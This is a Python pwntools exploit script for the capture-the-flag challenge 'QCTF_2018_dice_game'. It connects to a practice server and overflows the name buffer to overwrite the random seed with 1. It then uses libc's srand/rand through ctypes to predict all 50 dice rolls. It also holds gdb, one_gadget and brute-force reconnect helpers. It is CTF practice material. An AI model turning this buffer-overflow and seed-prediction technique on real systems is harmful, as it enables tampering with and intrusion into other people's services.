# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from ctypes import *
# 原来这玩意可以混合编译
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './QCTF_2018_dice_game'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc/libc-2.27.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29614'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

paylaod = 'a'*0x40 + p32(1)*4

sa(" name: ",paylaod)
# lib = cdll.LoadLibrary( elf.libc.path )
lib = cdll.LoadLibrary('./libc/libc-2.27.so' )
lib.srand(1)
for i in range(50):
    sla('point(1~6):',lib.rand()%6 + 1)


p.interactive()

'''
@File    :   QCTF_2018_dice_game.py
@Time    :   2021/08/24 23:06:21
@Author  :   Niyah 
'''